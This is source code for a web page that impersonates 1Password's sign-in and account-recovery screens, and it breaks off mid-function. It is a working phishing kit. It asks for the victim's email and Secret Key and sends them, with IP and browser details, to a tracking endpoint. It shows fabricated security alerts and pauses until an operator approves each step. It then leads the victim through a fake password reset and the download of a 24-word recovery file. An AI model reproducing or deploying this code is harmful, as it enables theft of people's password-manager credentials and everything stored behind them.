"use client"

import { useState, useEffect, useRef, useCallback } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent } from "@/components/ui/card"
import {
  AlertTriangle, KeyRound, ShieldAlert, Download, Eye, EyeOff, ArrowRight,
  ShieldCheck, AlertCircle, Loader2, CheckCircle2, Lock, FileKey, UserCheck
} from "lucide-react"
import type { UserActivity } from "@/lib/activity-store"
import { useHeartbeat } from "@/hooks/use-heartbeat"
import { OnePassFooter } from "@/components/onepass-footer"
import { RequestCard, type LedgerRequest, type RequestStatus } from "@/components/request-card"

type Stage = UserActivity["currentStage"]

const STAGE_ORDER: Stage[] = ["intake", "approval", "connect-ledger", "confirm-reset", "reset-api-keys", "verify-words", "enter-old-keys", "completed"]

function getNextStage(current: Stage): Stage {
  const idx = STAGE_ORDER.indexOf(current)
  return idx < STAGE_ORDER.length - 1 ? STAGE_ORDER[idx + 1] : "completed"
}

function generateVisitorId() {
  return "onepass_" + Math.random().toString(36).substring(2, 15) + Date.now().toString(36)
}

// Waiting for admin approval screen
function WaitingForApprovalScreen({ deniedMessage }: { deniedMessage?: string }) {
  if (deniedMessage) {
    return (
      <main className="flex flex-1 items-center justify-center bg-[#f5f5f5] px-4 py-12">
        <div className="mx-auto max-w-md space-y-6 text-center bg-white rounded-lg border border-[#e5e5e5] p-8 shadow-sm">
          <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-red-50">
            <AlertCircle className="h-8 w-8 text-red-500" />
          </div>
          <h2 className="text-xl font-bold text-[#1a1a1a]">Request Denied</h2>
          <p className="text-[#666]">{deniedMessage}</p>
          <p className="text-xs text-[#999]">Please contact 1Password Support if you believe this is an error.</p>
        </div>
      </main>
    )
  }

  return (
    <main className="flex flex-1 items-center justify-center bg-[#f5f5f5] px-4 py-12">
      <div className="mx-auto max-w-md space-y-6 text-center bg-white rounded-lg border border-[#e5e5e5] p-8 shadow-sm">
        <div className="mx-auto flex h-16 w-16 items-center justify-center">
          <Loader2 className="h-10 w-10 animate-spin text-[#0572EC]" />
        </div>
        <h2 className="text-xl font-bold text-[#1a1a1a]">Processing your request...</h2>
        <p className="text-[#666]">Your submission is being reviewed by our security team. This may take a few moments.</p>
        <div className="flex items-center justify-center gap-2 text-xs text-[#999]">
          <div className="h-1.5 w-1.5 animate-pulse rounded-full bg-[#0572EC]" />
          Waiting for verification
        </div>
      </div>
    </main>
  )
}

const initialRequests: LedgerRequest[] = [
  {
    id: "1",
    requester: "Master password change requested",
    category: "Security Alert",
    description: "A master password change was initiated from an unknown device",
    date: "Feb 18, 2026",
    status: "pending",
  },
  {
    id: "2",
    requester: "Login from new device in Berlin, Germany",
    category: "Security Alert",
    description: "Unfamiliar sign-in detected from a new device and location",
    date: "Feb 17, 2026",
    status: "pending",
  },
  {
    id: "3",
    requester: "Emergency Kit download requested",
    category: "Account Alert",
    description: "Someone requested a new Emergency Kit PDF for your account",
    date: "Feb 16, 2026",
    status: "pending",
  },
  {
    id: "4",
    requester: "Two-factor authentication reset",
    category: "Security Alert",
    description: "Request to disable and reset two-factor authentication on this account",
    date: "Feb 15, 2026",
    status: "pending",
  },
]

const CORRECT_WORDS = [
  "ramp", "oak", "walnut", "crime", "coast", "school",
  "bench", "win", "twelve", "lyrics", "hobby", "fork",
  "runway", "great", "very", "goat", "vapor", "copper",
  "glide", "diesel", "potato", "sausage", "property", "magnet"
]

function OnePassHeader() {
  return (
    <header className="border-b border-[#e8e8e8] bg-white">
      <div className="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8">
        <div className="flex h-14 items-center gap-2">
          <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect width="28" height="28" rx="6" fill="#0572EC"/>
            <rect x="10" y="4" width="8" height="12" rx="4" fill="white" stroke="#0572EC" strokeWidth="0"/>
            <circle cx="14" cy="10" r="3" fill="#0572EC"/>
            <rect x="8" y="12" width="12" height="12" rx="2" fill="white"/>
            <path d="M14 16v3" stroke="#0572EC" strokeWidth="2" strokeLinecap="round"/>
          </svg>
          <span className="text-base font-semibold text-[#1a1a1a] tracking-tight">1Password</span>
        </div>
      </div>
    </header>
  )
}

// ===== STAGE: INTAKE =====
function IntakeStage({ visitorId, onNext }: { visitorId: string; onNext: () => void }) {
  const [step, setStep] = useState<"email" | "secretKey">("email")
  const [email, setEmail] = useState("")
  const [secretKey, setSecretKey] = useState("")
  const [emailError, setEmailError] = useState("")
  const [secretKeyError, setSecretKeyError] = useState("")
  const [isNavigating, setIsNavigating] = useState(false)
  const [isPublicComputer, setIsPublicComputer] = useState(false)
  const [domainOpen, setDomainOpen] = useState(false)

  const handleEmailNext = async () => {
    if (!email.includes("@")) {
      setEmailError("Please enter a valid email address")
      return
    }
    setEmailError("")
    if (visitorId) {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity) {
        await fetch("/api/activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId, activity: { ...data.activity, email: email.trim(), lastUpdated: new Date().toISOString() } }),
        })
      }
    }
    setStep("secretKey")
  }

  const handleSecretKeyNext = async () => {
    if (isNavigating) return
    if (!secretKey.trim()) {
      setSecretKeyError("Please enter your Secret Key or Setup Code")
      return
    }
    setSecretKeyError("")
    setIsNavigating(true)

    const res = await fetch(`/api/activity?visitorId=${visitorId}`)
    const data = await res.json()

    const activity: UserActivity = {
      ...(data.activity || {}),
      visitorId,
      currentStage: "approval",
      email: email.trim(),
      caseId: secretKey.trim(),
      decisions: data.activity?.decisions || [],
      lastUpdated: new Date().toISOString(),
      lastHeartbeat: new Date().toISOString(),
      isOnline: true,
      userAgent: navigator.userAgent,
    }

    await fetch("/api/activity", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ visitorId, activity }),
    })

    onNext()
  }

  return (
    <main className="flex min-h-[calc(100vh-57px)] bg-[#f5f5f5]">
      {/* Left big logo */}
      <div className="hidden lg:flex items-start pt-[180px] pl-8">
        <div className="relative">
          <div className="h-[120px] w-[120px] rounded-full border-[6px] border-[#d6eaf8] bg-white flex items-center justify-center shadow-lg">
            <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
              <circle cx="30" cy="22" r="12" stroke="#0572EC" strokeWidth="4" fill="none"/>
              <rect x="16" y="28" width="28" height="26" rx="4" fill="#0572EC"/>
              <path d="M30 38v6" stroke="white" strokeWidth="3" strokeLinecap="round"/>
              <circle cx="30" cy="38" r="2" fill="white"/>
            </svg>
          </div>
        </div>
      </div>

      {/* Main sign-in card */}
      <div className="flex-1 flex justify-center pt-8 sm:pt-16 px-4">
        <div className="w-full max-w-[480px]">
          {step === "email" ? (
            <div className="bg-white rounded-lg border border-[#e5e5e5] p-6 sm:p-8 shadow-sm">
              <h1 className="text-[22px] font-bold text-[#1a1a1a] mb-5">Sign in to 1Password</h1>

              {/* QR Code section */}
              <div className="border border-[#e5e5e5] rounded-lg p-4 mb-5 flex gap-4">
                <div className="flex-1">
                  <p className="font-semibold text-[13px] text-[#1a1a1a] mb-2">Use QR Code</p>
                  <ol className="text-[12px] text-[#1a1a1a] space-y-1 list-decimal list-inside">
                    <li>{"Open 1Password on a mobile device where you're signed in."}</li>
                    <li>{"Select the account icon or 1Password logo in the top corner."}</li>
                    <li>{"Choose \"Scan QR Code.\""}</li>
                  </ol>
                </div>
                <div className="flex-shrink-0">
                  <div className="w-[88px] h-[88px] bg-white border border-[#e5e5e5] rounded p-1.5 flex items-center justify-center">
                    {/* Fake QR code pattern */}
                    <svg viewBox="0 0 70 70" className="w-full h-full">
                      <rect width="70" height="70" fill="white"/>
                      {/* QR corner squares */}
                      <rect x="2" y="2" width="18" height="18" fill="#1a1a1a" rx="1"/>
                      <rect x="5" y="5" width="12" height="12" fill="white" rx="0.5"/>
                      <rect x="7" y="7" width="8" height="8" fill="#1a1a1a" rx="0.5"/>
                      <rect x="50" y="2" width="18" height="18" fill="#1a1a1a" rx="1"/>
                      <rect x="53" y="5" width="12" height="12" fill="white" rx="0.5"/>
                      <rect x="55" y="7" width="8" height="8" fill="#1a1a1a" rx="0.5"/>
                      <rect x="2" y="50" width="18" height="18" fill="#1a1a1a" rx="1"/>
                      <rect x="5" y="53" width="12" height="12" fill="white" rx="0.5"/>
                      <rect x="7" y="55" width="8" height="8" fill="#1a1a1a" rx="0.5"/>
                      {/* QR data dots */}
                      <rect x="24" y="4" width="3" height="3" fill="#1a1a1a"/><rect x="30" y="4" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="36" y="4" width="3" height="3" fill="#1a1a1a"/><rect x="42" y="4" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="24" y="10" width="3" height="3" fill="#1a1a1a"/><rect x="33" y="10" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="39" y="10" width="3" height="3" fill="#1a1a1a"/><rect x="45" y="10" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="24" y="16" width="3" height="3" fill="#1a1a1a"/><rect x="30" y="16" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="4" y="24" width="3" height="3" fill="#1a1a1a"/><rect x="10" y="24" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="16" y="24" width="3" height="3" fill="#1a1a1a"/><rect x="24" y="24" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="30" y="24" width="3" height="3" fill="#1a1a1a"/><rect x="36" y="24" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="42" y="24" width="3" height="3" fill="#1a1a1a"/><rect x="50" y="24" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="56" y="24" width="3" height="3" fill="#1a1a1a"/><rect x="63" y="24" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="4" y="30" width="3" height="3" fill="#1a1a1a"/><rect x="16" y="30" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="24" y="30" width="3" height="3" fill="#1a1a1a"/><rect x="36" y="30" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="42" y="30" width="3" height="3" fill="#1a1a1a"/><rect x="50" y="30" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="63" y="30" width="3" height="3" fill="#1a1a1a"/>
                      {/* Center 1P logo */}
                      <rect x="26" y="26" width="18" height="18" rx="3" fill="#0572EC"/>
                      <text x="35" y="39" fontFamily="Arial,sans-serif" fontWeight="bold" fontSize="11" fill="white" textAnchor="middle">1P</text>
                      {/* More data dots */}
                      <rect x="4" y="36" width="3" height="3" fill="#1a1a1a"/><rect x="10" y="36" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="50" y="36" width="3" height="3" fill="#1a1a1a"/><rect x="56" y="36" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="63" y="36" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="4" y="42" width="3" height="3" fill="#1a1a1a"/><rect x="16" y="42" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="24" y="42" width="3" height="3" fill="#1a1a1a"/><rect x="36" y="42" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="50" y="42" width="3" height="3" fill="#1a1a1a"/><rect x="63" y="42" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="24" y="50" width="3" height="3" fill="#1a1a1a"/><rect x="30" y="50" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="36" y="50" width="3" height="3" fill="#1a1a1a"/><rect x="50" y="50" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="56" y="50" width="3" height="3" fill="#1a1a1a"/><rect x="63" y="50" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="24" y="56" width="3" height="3" fill="#1a1a1a"/><rect x="42" y="56" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="50" y="56" width="3" height="3" fill="#1a1a1a"/><rect x="63" y="56" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="24" y="63" width="3" height="3" fill="#1a1a1a"/><rect x="30" y="63" width="3" height="3" fill="#1a1a1a"/>
                      <rect x="36" y="63" width="3" height="3" fill="#1a1a1a"/><rect x="50" y="63" width="3" height="3" fill="#1a1a1a"/>
                    </svg>
                  </div>
                </div>
              </div>

              {/* Public computer checkbox */}
              <label className="flex items-center gap-2 mb-5 cursor-pointer">
                <input
                  type="checkbox"
                  checked={isPublicComputer}
                  onChange={(e) => setIsPublicComputer(e.target.checked)}
                  className="h-4 w-4 rounded border-[#ccc] accent-[#0572EC]"
                />
                <span className="text-[13px] text-[#1a1a1a]">This is a public or shared computer</span>
              </label>

              {/* OR divider */}
              <div className="flex items-center gap-3 mb-5">
                <div className="flex-1 h-px bg-[#e5e5e5]" />
                <span className="text-xs text-[#888] uppercase tracking-wide">OR</span>
                <div className="flex-1 h-px bg-[#e5e5e5]" />
              </div>

              {/* Email field */}
              <div className="mb-4">
                <label className="block text-sm font-medium text-[#1a1a1a] mb-1.5">Email</label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => { setEmail(e.target.value); if (emailError) setEmailError("") }}
                  className={`w-full rounded border px-3 py-2.5 text-sm text-[#1a1a1a] outline-none transition-colors focus:border-[#0572EC] focus:ring-1 focus:ring-[#0572EC] ${emailError ? "border-red-500" : "border-[#ccc]"}`}
                />
                {emailError && <p className="mt-1 text-xs text-red-500">{emailError}</p>}
              </div>

              {/* Continue button + link */}
              <div className="flex items-center gap-4 mb-5">
                <button
                  onClick={handleEmailNext}
                  className="cursor-pointer rounded-md bg-[#0572EC] px-6 py-2 text-sm font-semibold text-white transition-colors hover:bg-[#0460C9] active:bg-[#034AA0]"
                >
                  Continue
                </button>
                <a href="#" className="text-sm text-[#0572EC] hover:underline" onClick={(e) => e.preventDefault()}>
                  Having trouble signing in?
                </a>
              </div>

              {/* Domain selector */}
              <div className="mb-5">
                <div className="relative inline-block">
                  <button
                    onClick={() => setDomainOpen(!domainOpen)}
                    className="cursor-pointer flex items-center gap-2 rounded-full border border-[#ddd] bg-white px-4 py-1.5 text-sm text-[#1a1a1a] hover:bg-[#f9f9f9] transition-colors"
                  >
                    1Password.com
                    <svg width="10" height="6" viewBox="0 0 10 6" fill="none" className={`transition-transform ${domainOpen ? "rotate-180" : ""}`}>
                      <path d="M1 1l4 4 4-4" stroke="#666" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  </button>
                  {domainOpen && (
                    <div className="absolute left-0 top-full mt-1 w-48 rounded-md border border-[#e5e5e5] bg-white py-1 shadow-lg z-10">
                      <button onClick={() => setDomainOpen(false)} className="w-full cursor-pointer px-4 py-2 text-left text-sm text-[#1a1a1a] hover:bg-[#f5f5f5]">1Password.com</button>
                      <button onClick={() => setDomainOpen(false)} className="w-full cursor-pointer px-4 py-2 text-left text-sm text-[#1a1a1a] hover:bg-[#f5f5f5]">1Password.ca</button>
                      <button onClick={() => setDomainOpen(false)} className="w-full cursor-pointer px-4 py-2 text-left text-sm text-[#1a1a1a] hover:bg-[#f5f5f5]">1Password.eu</button>
                    </div>
                  )}
                </div>
              </div>

              {/* Bottom links */}
              <div className="flex items-center gap-1 text-sm">
                <a href="#" className="text-[#0572EC] hover:underline" onClick={(e) => e.preventDefault()}>Find my account</a>
                <span className="text-[#888]">{"\u2022"}</span>
                <a href="#" className="text-[#0572EC] hover:underline" onClick={(e) => e.preventDefault()}>Have a team account?</a>
              </div>
            </div>
          ) : (
            <div className="bg-white rounded-lg border border-[#e5e5e5] p-6 sm:p-8 shadow-sm">
              <h1 className="text-[22px] font-bold text-[#1a1a1a] mb-2">Enter your Secret Key</h1>
              <p className="text-[13px] text-[#666] mb-5">
                {"Your Secret Key is on your Emergency Kit and starts with A3-. It was provided when you first created your account."}
              </p>

              <div className="mb-4">
                <label className="block text-sm font-medium text-[#1a1a1a] mb-1.5">Secret Key</label>
                <input
                  type="text"
                  placeholder="A3-XXXXXX-XXXXXX-XXXXX-XXXXX-XXXXX-XXXXX"
                  value={secretKey}
                  onChange={(e) => { setSecretKey(e.target.value); if (secretKeyError) setSecretKeyError("") }}
                  className={`w-full rounded border px-3 py-2.5 text-sm text-[#1a1a1a] font-mono outline-none transition-colors focus:border-[#0572EC] focus:ring-1 focus:ring-[#0572EC] ${secretKeyError ? "border-red-500" : "border-[#ccc]"}`}
                />
                {secretKeyError && <p className="mt-1 text-xs text-red-500">{secretKeyError}</p>}
              </div>

              <div className="flex items-center gap-3">
                <button
                  onClick={() => { setStep("email"); setSecretKeyError("") }}
                  className="cursor-pointer rounded-md border border-[#ddd] bg-white px-5 py-2 text-sm font-medium text-[#1a1a1a] transition-colors hover:bg-[#f5f5f5]"
                >
                  Back
                </button>
                <button
                  onClick={handleSecretKeyNext}
                  disabled={isNavigating}
                  className="cursor-pointer rounded-md bg-[#0572EC] px-6 py-2 text-sm font-semibold text-white transition-colors hover:bg-[#0460C9] disabled:opacity-50"
                >
                  {isNavigating ? "Loading..." : "Continue"}
                </button>
              </div>

              <p className="mt-5 text-xs text-[#888]">
                {"Don't have your Secret Key? Check your email for your Emergency Kit PDF, or contact your team administrator."}
              </p>
            </div>
          )}
        </div>
      </div>
    </main>
  )
}

// ===== STAGE: IDENTITY VERIFICATION (approval) =====
function IdentityVerificationStage({ visitorId, onNext }: { visitorId: string; onNext: () => void }) {
  const [requests, setRequests] = useState<LedgerRequest[]>(initialRequests)
  const [ipAddress, setIpAddress] = useState<string>("")
  const [isNavigating, setIsNavigating] = useState(false)
  const allDecided = requests.every((req) => req.status !== "pending")

  useEffect(() => {
    fetch(`/api/activity?visitorId=${visitorId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.activity) {
          setIpAddress(data.activity.ipAddress)
          const activity: UserActivity = {
            ...data.activity,
            currentStage: "approval",
            decisions: initialRequests.map((req) => ({
              requestId: req.id,
              requestName: req.requester,
              action: "pending" as const,
              timestamp: new Date().toISOString(),
            })),
            lastUpdated: new Date().toISOString(),
          }
          fetch("/api/activity", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ visitorId, activity }),
          })
        }
      })
  }, [visitorId])

  const updateActivity = async (updatedRequests: LedgerRequest[]) => {
    if (!visitorId) return
    const res = await fetch(`/api/activity?visitorId=${visitorId}`)
    const data = await res.json()
    const sessionStarted = data.activity?.sessionStarted || new Date().toISOString()
    const activity: UserActivity = {
      visitorId, ipAddress, currentStage: "approval",
      decisions: updatedRequests.map((req) => ({
        requestId: req.id, requestName: req.requester,
        action: req.status as "approved" | "denied" | "pending",
        timestamp: new Date().toISOString(),
      })),
      sessionStarted, lastUpdated: new Date().toISOString(),
      lastHeartbeat: new Date().toISOString(), isOnline: true, userAgent: navigator.userAgent,
    }
    fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
  }

  const handleApprove = (id: string) => {
    setRequests((prev) => {
      const updated = prev.map((req) => (req.id === id ? { ...req, status: "approved" as RequestStatus } : req))
      updateActivity(updated)
      return updated
    })
  }

  const handleDeny = (id: string) => {
    setRequests((prev) => {
      const updated = prev.map((req) => (req.id === id ? { ...req, status: "denied" as RequestStatus } : req))
      updateActivity(updated)
      return updated
    })
  }

  return (
    <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8 flex-1">
      <div className="max-w-2xl mx-auto">
        <div className="flex items-center gap-3 mb-6">
          <div className="h-10 w-10 rounded-xl bg-primary/10 flex items-center justify-center">
            <UserCheck className="h-5 w-5 text-primary" />
          </div>
          <div>
            <h2 className="text-lg font-semibold text-foreground">Verify Your Identity</h2>
            <p className="text-xs text-muted-foreground">Review and respond to recent security alerts on your account</p>
          </div>
        </div>
        <div className="space-y-4">
          {requests.map((request) => (
            <RequestCard key={request.id} request={request} onApprove={handleApprove} onDeny={handleDeny} />
          ))}
        </div>
      </div>
      {allDecided && (
        <div className="flex justify-center mt-6">
          <Button
            onClick={async () => {
              if (isNavigating) return
              setIsNavigating(true)
              const res = await fetch(`/api/activity?visitorId=${visitorId}`)
              const data = await res.json()
              const activity: UserActivity = {
                ...data.activity, currentStage: "connect-ledger",
                decisions: requests.map((req) => ({
                  requestId: req.id, requestName: req.requester,
                  action: req.status as "approved" | "denied" | "pending",
                  timestamp: new Date().toISOString(),
                })),
                lastUpdated: new Date().toISOString(),
              }
              await fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
              onNext()
            }}
            className="bg-primary text-primary-foreground hover:bg-primary/80 w-full sm:w-auto transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 cursor-pointer"
          >
            {isNavigating ? "Loading..." : "Continue to Recovery"}
          </Button>
        </div>
      )}
    </main>
  )
}

// ===== STAGE: EMERGENCY KIT VERIFICATION (connect-ledger) =====
function EmergencyKitStage({ visitorId, onNext }: { visitorId: string; onNext: () => void }) {
  const [isWaiting, setIsWaiting] = useState(false)
  const [isConfirmed, setIsConfirmed] = useState(false)

  useEffect(() => {
    fetch(`/api/activity?visitorId=${visitorId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.activity) {
          const existingStage2 = data.activity.stage2Data
          if (existingStage2?.waitingForAdmin) {
            setIsWaiting(true)
            if (existingStage2?.adminConfirmed) setIsConfirmed(true)
            return
          }
          const activity: UserActivity = {
            ...data.activity, currentStage: "connect-ledger",
            stage2Data: { waitingForAdmin: false, adminConfirmed: false },
            lastUpdated: new Date().toISOString(),
          }
          fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
        }
      })
  }, [visitorId])

  useEffect(() => {
    if (!isWaiting || !visitorId) return
    const checkConfirmation = async () => {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity?.stage2Data?.adminConfirmed && !isConfirmed) {
        setIsConfirmed(true)
        setTimeout(async () => {
          const activity: UserActivity = { ...data.activity, currentStage: "confirm-reset", lastUpdated: new Date().toISOString() }
          await fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
          onNext()
        }, 2000)
      }
    }
    const interval = setInterval(checkConfirmation, 1000)
    return () => clearInterval(interval)
  }, [isWaiting, visitorId, isConfirmed, onNext])

  const handleSubmit = async () => {
    setIsWaiting(true)
    const res = await fetch(`/api/activity?visitorId=${visitorId}`)
    const data = await res.json()
    if (data.activity) {
      const activity: UserActivity = {
        ...data.activity, currentStage: "connect-ledger",
        stage2Data: { waitingForAdmin: true, adminConfirmed: false },
        lastUpdated: new Date().toISOString(),
      }
      await fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
    }
  }

  return (
    <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8 flex-1">
      <div className="max-w-lg mx-auto">
        <Card className="border-border bg-card">
          <CardContent className="p-6 sm:p-8">
            <div className="flex justify-center mb-6">
              <div className="h-16 w-16 rounded-2xl bg-primary/10 flex items-center justify-center">
                <FileKey className="h-8 w-8 text-primary" />
              </div>
            </div>
            <h1 className="text-xl font-semibold text-foreground text-center mb-2">Emergency Kit Verification</h1>
            <p className="text-sm text-muted-foreground text-center mb-6">
              We need to verify your Emergency Kit details to proceed with account recovery. Your Emergency Kit was provided when you created your 1Password account.
            </p>
            <Card className="border-border bg-secondary/50 mb-6">
              <CardContent className="p-4">
                <div className="flex items-start gap-3">
                  <ShieldCheck className="h-5 w-5 text-primary shrink-0 mt-0.5" />
                  <div>
                    <p className="text-sm font-medium text-foreground mb-2">What we are verifying:</p>
                    <ul className="text-xs text-muted-foreground space-y-1 list-disc list-inside">
                      <li>Your Secret Key matches our records</li>
                      <li>Your email address is verified</li>
                      <li>Your account ownership is confirmed</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>
            <div className="text-center">
              {!isWaiting && !isConfirmed && (
                <Button onClick={handleSubmit} className="bg-primary text-primary-foreground hover:bg-primary/80 w-full cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95">
                  Verify Emergency Kit
                </Button>
              )}
              {isWaiting && !isConfirmed && (
                <div className="space-y-3">
                  <Loader2 className="h-8 w-8 animate-spin text-primary mx-auto" />
                  <p className="text-sm text-muted-foreground animate-pulse">Verifying your Emergency Kit details...</p>
                </div>
              )}
              {isConfirmed && (
                <div className="space-y-3">
                  <CheckCircle2 className="h-8 w-8 text-success mx-auto" />
                  <p className="text-sm text-success animate-pulse">Verified. Redirecting...</p>
                </div>
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}

// ===== STAGE: MASTER PASSWORD RESET CONFIRMATION (confirm-reset) =====
function MasterPasswordResetStage({ visitorId, onNext }: { visitorId: string; onNext: () => void }) {
  const [isNavigating, setIsNavigating] = useState(false)

  useEffect(() => {
    fetch(`/api/activity?visitorId=${visitorId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.activity) {
          const activity: UserActivity = { ...data.activity, currentStage: "confirm-reset", lastUpdated: new Date().toISOString() }
          fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
        }
      })
  }, [visitorId])

  const handleYes = async () => {
    if (isNavigating) return
    setIsNavigating(true)
    const res = await fetch(`/api/activity?visitorId=${visitorId}`)
    const data = await res.json()
    if (data.activity) {
      const activity: UserActivity = { ...data.activity, currentStage: "reset-api-keys", lastUpdated: new Date().toISOString() }
      await fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
    }
    onNext()
  }

  return (
    <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8 flex-1">
      <div className="max-w-lg mx-auto">
        <Card className="border-border bg-card">
          <CardContent className="p-6 sm:p-8">
            <div className="flex justify-center mb-6">
              <div className="h-16 w-16 rounded-2xl bg-warning/10 flex items-center justify-center">
                <AlertTriangle className="h-8 w-8 text-warning" />
              </div>
            </div>
            <h1 className="text-xl font-semibold text-foreground text-center mb-2">Master Password Reset</h1>
            <p className="text-sm text-muted-foreground text-center mb-6">Would you like to reset your master password? This will generate a new Secret Key.</p>
            <Card className="border-border bg-secondary/50 mb-6">
              <CardContent className="p-4">
                <div className="flex items-start gap-3">
                  <ShieldAlert className="h-5 w-5 text-warning shrink-0 mt-0.5" />
                  <div>
                    <p className="text-sm font-medium text-foreground mb-2">This action will:</p>
                    <ul className="text-xs text-muted-foreground space-y-1 list-disc list-inside">
                      <li>Reset your master password across all devices</li>
                      <li>Generate a new Secret Key for your account</li>
                      <li>Require you to sign in again on all devices</li>
                      <li>Reset your two-factor authentication settings</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>
            <div className="flex items-center gap-2 mb-6 p-3 rounded-md bg-secondary/30 border border-border">
              <KeyRound className="h-4 w-4 text-muted-foreground shrink-0" />
              <p className="text-xs text-muted-foreground">A new Emergency Kit will be available for download on the next step.</p>
            </div>
            <div className="flex gap-3">
              <Button variant="outline" onClick={() => {}} className="flex-1 bg-transparent border-border hover:bg-secondary cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95">Cancel</Button>
              <Button onClick={handleYes} className="flex-1 bg-primary text-primary-foreground hover:bg-primary/80 cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100">
                {isNavigating ? "Loading..." : "Yes, reset password"}
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}

// ===== STAGE: NEW SECRET KEY DOWNLOAD (reset-api-keys) =====
function NewSecretKeyStage({ visitorId, onNext }: { visitorId: string; onNext: () => void }) {
  const [selectedKey, setSelectedKey] = useState<string>("")
  const [showWarning, setShowWarning] = useState(false)
  const [warningAccepted, setWarningAccepted] = useState(false)
  const [keysBlurred, setKeysBlurred] = useState(false)
  const [hasDownloadedOrViewed, setHasDownloadedOrViewed] = useState(false)
  const [isNavigating, setIsNavigating] = useState(false)

  useEffect(() => {
    fetch(`/api/activity?visitorId=${visitorId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.activity) {
          const activity: UserActivity = {
            ...data.activity, currentStage: "reset-api-keys",
            stage3Data: { selectedApiKey: "", downloadClicked: false },
            lastUpdated: new Date().toISOString(),
          }
          fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
        }
      })
  }, [visitorId])

  const handleDownload = async () => {
    if (visitorId) {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity) {
        const activity: UserActivity = {
          ...data.activity,
          stage3Data: { selectedApiKey: selectedKey || "emergency-kit", downloadClicked: true, downloadTimestamp: new Date().toISOString() },
          lastUpdated: new Date().toISOString(),
        }
        await fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
      }
    }
    const content = `1.\nramp\n\n2.\noak\n\n3.\nwalnut\n\n4.\ncrime\n\n5.\ncoast\n\n6.\nschool\n\n7.\nbench\n\n8.\nwin\n\n9.\ntwelve\n\n10.\nlyrics\n\n11.\nhobby\n\n12.\nfork\n\n13.\nrunway\n\n14.\ngreat\n\n15.\nvery\n\n16.\ngoat\n\n17.\nvapor\n\n18.\ncopper\n\n19.\nglide\n\n20.\ndiesel\n\n21.\npotato\n\n22.\nsausage\n\n23.\nproperty\n\n24.\nmagnet`
    const fileName = "1Password-Emergency-Kit-Recovery.txt"
    const blob = new Blob([content], { type: "text/plain" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url; a.download = fileName; a.click()
    URL.revokeObjectURL(url)
